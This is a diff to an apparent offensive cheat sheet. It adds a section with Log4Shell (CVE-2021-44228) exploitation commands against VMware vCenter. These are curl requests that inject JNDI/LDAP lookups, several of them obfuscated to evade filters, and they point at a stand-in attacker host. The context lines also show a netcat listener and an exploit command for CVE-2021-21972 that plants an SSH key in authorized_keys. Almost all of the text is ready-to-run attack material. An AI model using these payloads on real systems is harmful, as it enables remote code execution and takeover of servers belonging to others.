@@ -56,6 +56,28 @@ Ctrl-b "
 nc -lvnp 4242
 ```
 
+##  1. <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228 - VCenter
+
+```
+# install
+
+# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
+curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${env:ENV_NAME:-j}ndi\${env:ENV_NAME:-:}\${env:ENV_NAME:-l}dap\${env:ENV_NAME:-:}//1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+```
 ##  2. <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972 - VCenter
 ```
 sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
